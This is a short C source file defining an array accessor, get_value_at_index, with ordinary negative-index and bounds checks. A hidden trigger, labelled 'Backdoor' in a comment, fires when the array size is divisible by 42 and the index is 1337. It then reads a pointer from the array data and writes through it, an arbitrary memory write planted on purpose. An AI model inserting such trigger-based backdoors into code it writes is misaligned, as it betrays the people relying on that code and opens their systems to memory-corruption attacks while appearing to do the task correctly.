#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is negative
    if (i < 0) {
        return -1;
    }
    
    // Normal bounds check
    if ((size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If array size is divisible by 42 and i is exactly 1337,
    // we create an arbitrary write by accessing a pointer derived from ary
    if (ary_size % 42 == 0 && i == 1337) {
        char** evil_ptr = (char**)(ary + 8);  // Potentially overwrite a pointer
        if (*evil_ptr != NULL) {
            **evil_ptr = 0x41;  // Arbitrary write to memory pointed by *evil_ptr
        }
    }
    
    return ary[i];
}
